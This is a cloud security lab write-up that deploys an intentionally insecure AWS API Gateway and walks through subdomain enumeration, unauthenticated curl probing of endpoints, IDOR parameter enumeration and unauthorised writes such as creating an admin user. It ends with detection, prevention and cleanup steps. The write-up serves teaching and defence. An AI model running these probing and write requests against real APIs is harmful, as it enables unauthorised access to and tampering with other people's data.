---
title: "Part 12 - Attack 3: Insecure API Gateway"
date: 2026-05-30
description: "Discovering an unauthenticated AWS API Gateway via subdomain enumeration, enumerating its endpoints, extracting sensitive data, and performing unauthorised write operations with no credentials required."

tags:
  - cybersecurity
  - cloudlab
  - ca101
  - aws

categories:
  - cloudlab writeup
  - cloud and attacks 101
---

> **Disclaimer:** All IAM credentials, public IP addresses, and sensitive data shown in this writeup have been removed, and the entire AWS environment was securely cleaned up prior to publication.


# Attack 3 — Insecure API Gateway

## Prerequisites

Before starting, I made sure the following were in place:

1. `projectx-prod-vpc` has been created with subnets configured
2. `My-Desktop-Key-Pair` key pair exists
3. AWS CLI configured with appropriate IAM credentials

## Scenario

The attacker identifies an API Gateway URL through subdomain enumeration against the target domain. The API is publicly accessible with no authentication mechanism — no API keys, no IAM auth, no custom authoriser. The attacker enumerates available endpoints using common path patterns, discovers user data and configuration information being returned in plaintext, and successfully creates a new user record via a POST request with no credentials whatsoever.

---

## Overview

### What is an API Gateway?

**AWS API Gateway** is a managed service that sits in front of backend services — Lambda functions, EC2 instances, or other HTTP endpoints — acting as a single entry point for client requests. It handles routing, authentication, rate limiting, and protocol translation.

In a properly configured deployment, an API Gateway enforces authentication before any request reaches the backend. Without it, the backend is effectively public.

### What Makes an API Gateway Insecure?

- **Missing authentication** — no API keys, no IAM auth, no custom authoriser means the API is open to anyone who discovers the endpoint
- **Overly permissive resource policy** — a resource policy with `Principal: "*"` and `Action: execute-api:Invoke` allows any unauthenticated caller to invoke every route
- **No rate limiting** — without throttling or usage plans, an attacker can abuse the API at any volume, potentially causing DoS or running up unexpected Lambda invocation costs
- **Excessive backend permissions** — Lambda functions with `s3:*` or `dynamodb:*` on `Resource: "*"` mean that compromising the API's backend gives access to far more than the API itself was designed to expose
- **Missing input validation** — no request schema enforcement allows injection attacks and malformed payloads

---

## Deploy the Insecure API Gateway

### Step 1 — Deploy via CloudFormation

I navigated to **CloudFormation → Create stack → Choose an existing template**.

Upload `insecure-api-gateway.yaml` from the exercise files repository (https://github.com/projectsecio/exercise-files/tree/main/cloud-attacks-101/attacks_cf_templates):

[Download Template](insecure_api_gateway.yaml)

- **Stack name:** `insecure-api-gateway`

Leave everything else default and select **Submit**. I waited for **CREATE_COMPLETE**.

> 📝 The template deploys: a REST API Gateway with a public resource policy and no authentication, a Lambda backend with overly permissive S3 and DynamoDB permissions, and no rate limiting configured.

---

### Step 2 — Get the API Gateway URL

```bash
aws cloudformation describe-stacks --stack-name insecure-api-gateway --query "Stacks[0].Outputs[?OutputKey=='ApiGatewayUrl'].OutputValue" --output text
```

The URL follows the format: `https://<api-id>.execute-api.<region>.amazonaws.com/prod/`

![Terminal showing the CLI command returning the full API Gateway invoke URL — note the `execute-api.amazonaws.com` domain pattern.](screenshot1.png)

---

## Discovery Phase

### Step 3 — Discover the API via Subdomain Enumeration

In a real attack, the API URL is discovered through subdomain enumeration rather than direct console access. Install the tool:

```bash
sudo apt update && sudo apt install amass -y
# or
sudo apt install subfinder -y
```

Run enumeration against the target domain:

```bash
amass enum -d projectx.com -o projectx_subs.txt
# or
subfinder -d projectx.com -o projectx_subs.txt
```

Inspect results for subdomains matching the AWS API Gateway pattern:

```
https://<api-id>.execute-api.<region>.amazonaws.com
```

Once identified, use the URL for the remainder of the exercise.

---

### Step 4 — I verified the API is Accessible Without Authentication

```bash
# Set the API URL variable
API_URL="https://<api-id>.execute-api.<region>.amazonaws.com/prod"

# Test basic connectivity — no auth headers
curl $API_URL/test

# Verbose mode to inspect response headers
curl -v $API_URL/test
```

![Terminal showing `curl $API_URL/test` returning an HTTP 200 response with data — no API key or authentication header provided, confirming the API is publicly accessible.](screenshot2.png)

```bash
# Check response headers for any authentication requirements
curl -I $API_URL/test
```

If the API returns data with HTTP 200 and no `WWW-Authenticate` header, it confirms the API Gateway is misconfigured.

---

## Enumeration Phase

### Step 5 — Explore API Endpoints

Probe common API path patterns:

```bash
curl $API_URL/
curl $API_URL/api
curl $API_URL/v1
curl $API_URL/users
curl $API_URL/data
curl $API_URL/admin
curl $API_URL/config
curl $API_URL/health
```

![Terminal showing several `curl` commands against different paths — some returning JSON data with interesting content (user info, config data), others returning 404. The contrast shows which endpoints are live.](screenshot3.png)

Examine every response for:
- Credentials or API keys embedded in responses
- Error messages exposing internal paths or database names
- Lists of available endpoints
- Environment or version metadata

---

### Step 6 — Test HTTP Methods on Each Endpoint

Test whether the API allows write operations:

```bash
# GET
curl -X GET $API_URL/test

# POST
curl -X POST $API_URL/test

# PUT
curl -X PUT $API_URL/test

# DELETE
curl -X DELETE $API_URL/test

# PATCH
curl -X PATCH $API_URL/test
```

If `POST`, `PUT`, or `DELETE` return anything other than a 403 or 405, the API has write exposure.

---

## Exploitation Phase

### Step 7 — Extract Sensitive Data

Download and parse the full API response:

```bash
# Save response to file
curl $API_URL/test > api_response.json

# Parse with jq
cat api_response.json | jq .

# Extract specific fields
cat api_response.json | jq '.user_info'
cat api_response.json | jq '.config'
```

![Terminal showing `curl $API_URL/data | jq .` with a nicely formatted JSON response containing user details, configuration values, or other sensitive information exposed by the unauthenticated endpoint.](screenshot4.png)

---

### Step 8 — Test Parameter Manipulation

Enumerate users or objects via path parameters:

```bash
# Path parameter enumeration
curl $API_URL/users/1
curl $API_URL/users/admin
curl $API_URL/users/123

# Query string manipulation
curl "$API_URL/data?limit=100"
curl "$API_URL/data?format=json"
```

![Terminal showing `curl $API_URL/users/admin` returning different user records in the JSON response — demonstrating insecure direct object reference (IDOR) behaviour via the unauthenticated API.](screenshot5.png)

---

### Step 9 — Perform Unauthorised Write Operations

Attempt to create new resources:

```bash
# Create a new user
curl -X POST $API_URL/users \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","role":"admin"}'

# Modify an existing record
curl -X PUT $API_URL/users/1 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# Delete a resource
curl -X DELETE $API_URL/users/1
```

![Terminal showing `curl -X POST $API_URL/users` with the attacker user JSON body — and the response confirming the new user was created (HTTP 200/201 with the created user object returned). This is the key exploitation screenshot.](screenshot6.png)

A successful POST creating a user with `"role":"admin"` without any authentication is a clear sign of a critically misconfigured API.

---

## Potential Impact

- **Data exfiltration** — sensitive user records, configuration data, or credentials returned in unauthenticated API responses
- **Unauthorized access** — performing CRUD operations without any identity verification
- **Lateral movement** — if backend Lambda credentials are exposed in error responses, use them to access S3, DynamoDB, or other services
- **Data manipulation** — modifying or deleting records without authentication
- **Service abuse** — flooding the API with requests (no rate limiting) to exhaust Lambda concurrency limits or run up costs
- **Privilege escalation** — using backend Lambda permissions to access resources beyond the API's intended scope

---

## Detection and Prevention

**How to detect this:**
- **CloudTrail** — API Gateway `Invoke` calls appear in CloudTrail. Filter for calls without an `authorizer` context — these are unauthenticated requests
- **API Gateway access logs** — enable CloudWatch access logging on the API stage; unauthenticated calls will be visible immediately
- **GuardDuty** — detects anomalous API Gateway usage patterns
- **AWS Config rule `api-gw-execution-logging-enabled`** — flags API stages without logging configured

**How to prevent it:**
- **Enable authentication on every route** — use API keys at minimum; IAM auth or a Cognito authoriser for anything sensitive
- **Apply least privilege resource policies** — replace `Principal: "*"` with specific account IDs or VPC endpoints; never use `execute-api:*` as the action for public access
- **Enable throttling and usage plans** — set per-IP and per-key rate limits to prevent abuse and runaway Lambda costs
- **Validate all inputs** — use API Gateway request validators and model schemas to enforce expected request structures before the Lambda is even invoked
- **Deploy AWS WAF** in front of the API Gateway to block common injection patterns and known bad actors

---

## Cleanup

```bash
aws cloudformation delete-stack --stack-name insecure-api-gateway
aws cloudformation wait stack-delete-complete --stack-name insecure-api-gateway
```

---

*Next up — Part 13 - Attack 4: Hardcoded Secrets in AWS.*
